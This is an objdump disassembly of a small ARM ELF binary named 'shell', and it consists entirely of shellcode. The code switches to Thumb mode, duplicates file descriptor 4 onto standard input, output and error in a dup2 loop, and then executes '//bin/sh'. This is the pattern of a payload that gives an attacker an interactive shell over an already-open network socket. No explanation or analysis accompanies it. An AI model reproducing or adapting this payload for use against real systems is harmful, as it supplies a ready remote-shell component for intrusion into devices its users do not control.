
shell:     file format elf32-littlearm


Disassembly of section .text:

000001b0 <_start>:
 1b0:	e28f3001 	add	r3, pc, #1
 1b4:	e12fff13 	bx	r3
 1b8:	2004      	movs	r0, #4
 1ba:	1a49      	subs	r1, r1, r1

000001bc <dup2_loop>:
 1bc:	273f      	movs	r7, #63	; 0x3f
 1be:	df01      	svc	1
 1c0:	3101      	adds	r1, #1
 1c2:	2903      	cmp	r1, #3
 1c4:	d1fa      	bne.n	1bc <dup2_loop>
 1c6:	4678      	mov	r0, pc
 1c8:	300a      	adds	r0, #10
 1ca:	9001      	str	r0, [sp, #4]
 1cc:	a901      	add	r1, sp, #4
 1ce:	1a92      	subs	r2, r2, r2
 1d0:	270b      	movs	r7, #11
 1d2:	df01      	svc	1
 1d4:	69622f2f 	.word	0x69622f2f
 1d8:	68732f6e 	.word	0x68732f6e
 1dc:	00000000 	.word	0x00000000
